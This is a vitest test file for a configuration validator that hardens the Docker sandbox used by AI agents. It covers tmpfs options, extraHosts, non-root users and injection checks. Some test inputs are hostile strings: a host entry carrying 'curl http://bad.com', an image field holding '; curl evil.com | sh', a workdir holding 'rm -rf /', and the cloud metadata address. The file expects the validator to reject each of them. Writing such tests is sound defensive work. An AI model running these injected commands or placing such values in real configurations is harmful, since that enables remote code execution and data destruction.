import { describe, expect, it, vi } from "vitest";

const { validateConfigObject } = await vi.importActual<typeof import("./config.js")>("./config.js");

describe("sandbox container hardening schema", () => {
  // ═══════════════════════════════════════════════════════════════════════
  // SBX-MEDIUM-01: tmpfs validation
  // ═══════════════════════════════════════════════════════════════════════

  describe("sandbox.docker.tmpfs — validated mount entries", () => {
    it("accepts valid tmpfs entries with paths only", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { tmpfs: ["/tmp", "/var/tmp", "/run"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("accepts tmpfs entries with safe options", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { tmpfs: ["/tmp:size=100m,noexec,nosuid"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("rejects tmpfs entries with exec option (weakens isolation)", () => {
      // 'exec' without 'no' prefix is not in allowed options list
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { tmpfs: ["/tmp:exec,suid"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects tmpfs entries with non-absolute paths", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { tmpfs: ["relative/path"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // SBX-MEDIUM-02: extraHosts validation
  // ═══════════════════════════════════════════════════════════════════════

  describe("sandbox.docker.extraHosts — validated host entries", () => {
    it("accepts valid hostname:ip entries", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["myhost:192.168.1.1"] },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("rejects cloud metadata IP (169.254.169.254)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["metadata.google.internal:169.254.169.254"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects malformed extraHosts entries", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["just-a-hostname"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects extraHosts with shell injection", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { extraHosts: ["evil;curl http://bad.com:1.2.3.4"] },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // SBX-MEDIUM-03: user field validation
  // ═══════════════════════════════════════════════════════════════════════

  describe("sandbox.docker.user — blocks root", () => {
    it("rejects user=root", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "root" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects user=0 (numeric root)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "0" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects user=0:0 (root:root)", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "0:0" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("accepts non-root user", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "sandbox" },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("accepts numeric non-root user", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "1000" },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });

    it("accepts user:group format for non-root", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { user: "1000:1000" },
            },
          },
        },
      });
      expect(res.ok).toBe(true);
    });
  });

  // ═══════════════════════════════════════════════════════════════════════
  // Existing sandbox config security regression
  // ═══════════════════════════════════════════════════════════════════════

  describe("regression — docker image and workspace path security", () => {
    it("rejects shell injection in docker image", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { image: "; curl evil.com | sh" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });

    it("rejects shell injection in workdir", () => {
      const res = validateConfigObject({
        agents: {
          defaults: {
            sandbox: {
              docker: { workdir: "/workspace; rm -rf /" },
            },
          },
        },
      });
      expect(res.ok).toBe(false);
    });
  });
});
